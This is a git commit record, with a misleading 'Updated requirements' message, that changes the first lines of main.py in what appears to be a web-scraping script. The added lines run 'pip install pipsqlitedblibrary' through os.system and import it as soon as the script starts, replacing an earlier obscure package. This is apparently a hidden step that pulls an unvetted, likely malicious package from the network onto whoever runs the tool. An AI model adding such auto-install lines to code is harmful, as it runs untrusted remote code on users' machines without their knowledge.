fe7ee1984d07acd6857834c125a14616f2b3a60f
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 17:10:24 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlite2mod")
-import pythonsqlite2mod
+os.system("pip install pipsqlitedblibrary")
+import pipsqlitedblibrary
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
